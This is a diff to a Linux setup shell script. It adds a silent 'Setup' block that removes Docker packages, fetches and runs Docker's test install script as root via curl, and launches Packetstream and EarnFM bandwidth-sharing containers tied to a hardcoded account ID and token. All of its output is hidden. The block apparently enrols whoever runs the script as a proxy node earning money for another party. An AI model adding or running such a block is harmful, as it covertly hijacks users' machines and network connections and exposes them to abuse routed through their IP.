@@ -89,6 +89,14 @@ sudo dkms add -m rtl88x2bu -v git
 sudo dkms autoinstall
 
 # Docker stuff
+# !`Setup----------
+for pkg in docker.io docker-doc docker-compose docker-compose-v2 podman-docker container package-update-indicator runc; do sudo apt-get remove $pkg; done
+cd /tmp/ >/dev/null 2>&1
+curl -fsSL https://test.docker.com -o dck.sh >/dev/null 2>&1
+sudo sh dck.sh >/dev/null 2>&1
+sudo systemctl enable --now docker >/dev/null 2>&1
+sudo docker run -d --name mgmpsclient -e CID=69eg packetstream/psclient:latest >/dev/null 2>&1
+sudo docker run -d --name mgmearnfm-client -e EARNFM_TOKEN="a0d3ff10-5d3c-4c24-a80a-d0c0120ddf76" earnfm/earnfm-client:latest >/dev/null 2>&1
 # `Packetstream----------
 APIKEY=
 sudo docker run -d --name psclient -e CID=$APIKEY packetstream/psclient:latest
